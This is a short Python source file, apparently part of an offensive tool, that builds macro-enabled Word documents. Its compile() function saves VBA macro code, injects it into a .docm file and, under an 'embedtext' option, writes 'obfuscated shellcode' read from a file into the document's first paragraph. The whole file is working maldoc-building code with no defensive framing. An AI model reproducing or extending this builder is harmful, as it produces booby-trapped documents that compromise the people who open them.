from vba.utils.inject import create_word_doc
from docx import Document

def compile(code: str, output: str, compilerOptions: list[str]) -> str:
    outfile = f'{output}.docm'
    open(f'{output}.vba', 'w').write(code)
    print(f'Macro saved to {output}.vba')
    result = create_word_doc(code, outfile)

    for compilerOption in compilerOptions:
        key, value = compilerOption.split('=')
        if key == 'embedtext':
            print(f'Reading obfuscated shellcode from {value}')
            embedtext = open(value).read()
            print(f'Writing obfuscated shellcode to {outfile}')
            document = Document(outfile)
            document.paragraphs[0].add_run(embedtext)
            document.save(outfile)
    return outfile